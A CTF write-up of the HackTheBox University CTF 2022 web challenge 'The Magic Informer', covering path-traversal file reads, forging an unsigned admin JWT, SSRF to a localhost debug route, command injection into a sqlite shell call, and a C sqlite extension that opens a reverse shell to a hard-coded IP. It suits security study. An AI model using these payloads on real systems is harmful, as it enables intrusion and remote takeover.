---
title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://user-images.githubusercontent.com/95465072/215008062-fa6a3eb8-8f2b-4c82-8d05-f7a81861edc9.png"> Hackthebox University CTF 2022| Supernatural Hacks
date: 2022-12-05 00:00:02 +240
categories: [Write Up, ctf]
tags: [write up, hackthebox, ctf,walkthrough,university-ctf,supernaturla-hacks] # TAG names should always be lowercase

---
&nbsp;

<img width="488" allign="center" alt="logo" src="https://user-images.githubusercontent.com/95465072/215003832-61668910-d734-48b3-bdb7-a1b7e6e0442e.jpg">






### Hackthebox University CTF 2022 : Supernatural Hacks 
It was  a University Wise CTF event held by HackTheBox with 942 teams participating from different universities across the world.  This is a writeup for one of the few challenges we solved in the event.

Description:

The Magic Informer is the only byte-sized wizarding newspaper that brings the best magical news to you at your fingertips! Due to popular demand and bold headlines, we are often targeted by wizards and hackers alike. We need you to pentest our news portal and see if you can gain access to our server.

----------

The given address gives the following webpage:

![TheMagicInformer](https://user-images.githubusercontent.com/95465072/215002700-bbe47199-717c-42d4-9c8c-2c9caa445a35.png)



Upon directory enumeration, we found several locations:
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://178.62.84.158:30191/ -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://178.62.84.158:30191/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/03 02:51:41 Starting gobuster in directory enumeration mode
===============================================================
/register             (Status: 200) [Size: 2120]
/login                (Status: 200) [Size: 2109]
/download             (Status: 302) [Size: 23] [--> /]
/admin                (Status: 302) [Size: 23] [--> /]
/static               (Status: 301) [Size: 179] [--> /static/]
/Login                (Status: 200) [Size: 2109]
/Download             (Status: 302) [Size: 23] [--> /]
/logout               (Status: 302) [Size: 23] [--> /]
/Register             (Status: 200) [Size: 2120]
/dashboard            (Status: 302) [Size: 23] [--> /]
/Admin                (Status: 302) [Size: 23] [--> /]
```

&nbsp;

create a account at   `/register`  and login  in via  `/login`  , then it will be redirected to   `/dashboard`:

![TheMagicInformer-1](https://user-images.githubusercontent.com/95465072/215002771-4ae351e6-ca6a-46bd-a368-b2cf2f9247bb.png)


The resume file upload functionality lets us upload any arbitrary file without restriction but appends .docx.

The uploaded file could be downloaded at  `/download?resume?HASH_OF_THE_FILE.docx`. After trying several payloads, We found out that its vulnerable to Local File Inclusion (path traversals) and was able to read several files and getting to know that the files are stored at  `/app/upload`.

passwd file obtained from the lfi:

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh
```

This lead us the ability to access the files (possible from node user) but not list directories.

Since it was a express app (Wappalyzer results), we tried checking for  `/app/package.json`  which lead us to get hands on the source code of the app and the sqlite database (`admin.db`).

After enumerating the sqlite db file, we found users and enrollments and settings tables. The setting files included some settings for a sms service with mostly a invalid apikey.

```
sqlite> select * from settings;
1|sms_verb|POST
2|sms_url|https://platform.clickatell.com/messages
3|sms_params|{"apiKey" : "xxxx", "toNumber": "recipient", "text": "message"}
4|sms_headers|Content-Type: application/json
Authorization: Basic YWRtaW46YWRtaW4=
5|sms_resp_ok|<status>ok</status>
6|sms_resp_bad|<status>error</status>
```

 Hash cat was unable to find the password hash obtained form admin.db

After checking the source code we found Additional routes that were not found while fuzzing using gobuster.

As we were Unable to retrieve the flag, We tried to get into website as the admin user:

We looked up at the  `JWTHelper.js`  and found out that it does not do signing verification so we could just modify the token (cookie) to access as a admin user.
```

import jwt from "jsonwebtoken";

import crypto from "crypto";

const APP_SECRET = crypto.randomBytes(69).toString('hex');

const sign = (data) => {
data = Object.assign(data);
return (jwt.sign(data, APP_SECRET, { algorithm:'HS256' })) 
}

const decode = async(token) => {
return (jwt.decode(token));
}

export { sign, decode };
```

![TheMagicInformer-2](https://user-images.githubusercontent.com/95465072/215002877-9326e797-53f1-40b9-914e-45675413a98e.png)


This lead us to the following page:  <br>
![TheMagicInformer-3](https://user-images.githubusercontent.com/95465072/215002950-baf7a192-bb33-4ed6-a06a-cfad18101b92.png)


The POST route to  `/debug/sql/exec`  caught our mind:

```
router.post('/debug/sql/exec', LocalMiddleware, AdminMiddleware, 
			async (req, res) => {
const { sql, password } = req.body;
if (sql && password === process.env.DEBUG_PASS) {
	try {
		let safeSql = String(sql).replaceAll(/"/ig, "'");
		let cmdStr = `sqlite3 -csv admin.db "${safeSql}"`;
		const cmdExec = execSync(cmdStr);
		return res.json({sql, output: cmdExec.toString()});
	}
catch (e) {
		let output = e.toString();
		if (e.stderr) output = e.stderr.toString();
		return res.json({sql, output});
	}
}
return res.status(500).send(response('Invalid debug password supplied!'));

});
```

It was executing a sqlite queries as a command on system with execSync taking an input from the user by only filtering out double quotes.

However we needed to be a localhost to execute the command and the sql-prompt.html also didn’t include a submit button. xD This and that the invalid  `apikey`  we found earlier just gave a instant hint that we can use the  `POST`  endpoint at  `/api/sms/test`  for sending the request at  `/debug/sql/exec`:

We came up with the following Request for making a valid sqlite query:

```
POST  /api/sms/test  HTTP/1.1  Host:  159.65.63.151:32528  Content-Length:  418  User-Agent:  Mozilla/5.0  (Windows  NT  10.0;  Win64;  x64)  AppleWebKit/537.36  (KHTML,  like  Gecko)  Chrome/105.0.5195.127  Safari/537.36  Content-Type:  application/json  Accept:  */*  Origin:  http://159.65.63.151:32528  Referer:  http://159.65.63.151:32528/sms-settings  Accept-Encoding:  gzip,  deflate  Accept-Language:  en-US,en;q=0.9  Cookie:session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjcwMDAxMDcyfQ.Nj1dGrOgfIJ9iNocGRSJmCIVKQhJhKqEyo3ExAu4vkE  Connection:  close  {"verb":"POST","url":"http://127.0.0.1:1337/debug/sql/exec","params":"{\"sql\" : \"select 0 from enrollments; & whoami\", \"password\": \"CzliwZJkV60hpPJ\"}","headers":"Content-Type: application/json\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjcwMDAxMDcyfQ.Nj1dGrOgfIJ9iNocGRSJmCIVKQhJhKqEyo3ExAu4vkE","resp_ok":"<status>ok</status>","resp_bad":"<status>error</status>"}  
```

![TheMagicInformer-4](https://user-images.githubusercontent.com/95465072/215003007-57d2a1db-d93f-4891-a70f-1f95cb097be0.png)


Now we needed to somehow get an RCE or the ability to execute commands but the double quote filter was a issue. Just simple searches lead me to the  `load_Extensions()`  function in sqlite.

We found the following github repository which included the source code to make a shared library file that the function takes in as a input then which later allows us to execute commands:  [GitHub Link](https://github.com/mpaolino/sqlite-execute-module)

We were able to execute commands like  `ls`  and  `whoami`:

![TheMagicInformer-5](https://user-images.githubusercontent.com/95465072/215003057-9c52ed52-f696-41a5-a9ec-78e1486b6611.png)



I tried copying the C code for reverse shell from the cheat sheet and adding it directly into the Shared library so that it gets executed with the main function of it.

So the final code we were left off with was the following:
```
#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */  SQLITE_EXTENSION_INIT1
#include <stdio.h> #include <sys/socket.h> #include <sys/types.h> #include <unistd.h> #include <netinet/in.h> #include <arpa/inet.h> #include <stdlib.h> #ifdef _WIN32 __declspec(dllexport)
#endif static void systemExec(
sqlite3_context *context,
int argc,
sqlite3_value **argv
){
const unsigned char * cmd = sqlite3_value_text(argv[0]);
int ret = system((const char *)cmd);
}
int sqlite3_extension_init(
sqlite3 *db,
char **pzErrMsg,
const sqlite3_api_routines *pApi
){
int port = 4242;
struct sockaddr_in revsockaddr;
int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("59.92.213.3");
connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);
char * const argv[] = {"/bin/sh", NULL};
execve("/bin/sh", argv, NULL);
SQLITE_EXTENSION_INIT2(pApi);
int rc = sqlite3_create_function(db, "execute", 1, SQLITE_UTF8 | SQLITE_INNOCUOUS, 0, systemExec, 0, 0);
// subsequent calls need to return OK since this will be used in injections and we can't really control how many times its going to be loaded
return SQLITE_OK;
}
```
After uploading the file and having a netcat listener at  `4242`. we loaded the file and successfully received a shell and got the flag:
![TheMagicInformer-6](https://user-images.githubusercontent.com/95465072/215003183-eae689fc-41b1-48b8-9a70-b07006bce589.png)


<!-- ![805310a1-2ee9-44ed-8dd8-a5c81befa8f8](https://user-images.githubusercontent.com/95465072/227514528-157c59bb-bc65-4dbe-b2f2-d4e29f9ae826.jpg) -->

<!-- 
<img width="349" alt="rotten1" src="https://user-images.githubusercontent.com/95465072/227515823-9cd9c27e-f95b-4c59-b14c-c48c8aa073a5.png">
![805310a1-2ee9-44ed-8dd8-a5c81befa8f8](https://user-images.githubusercontent.com/95465072/227515830-4e9fe07b-0ccc-4c38-ad50-fc9474abc6b6.jpg)
<img width="350" alt="rt6" src="https://user-images.githubusercontent.com/95465072/227515837-2e615e23-21fa-4163-945a-6e26a84549bb.png">
<img width="348" alt="last" src="https://user-images.githubusercontent.com/95465072/227515843-02d8d8d8-93c1-4b72-94c7-587d783924b7.png">
<img width="349" alt="rt2" src="https://user-images.githubusercontent.com/95465072/227515845-23dd6d83-4a46-48e2-b695-956644b6f677.png">
<img width="352" alt="rt4" src="https://user-images.githubusercontent.com/95465072/227515849-edad97a6-ce16-4015-a13a-47f341f64f86.png">
<img width="350" alt="rt5" src="https://user-images.githubusercontent.com/95465072/227515852-c6a39363-292b-4e6f-b37d-cf7d1a4be7c2.png"> -->


<!-- [forensics_roten.zip](https://github.com/sujayadkesar/sujayadkesar.github.io/files/11061886/forensics_roten.zip) -->


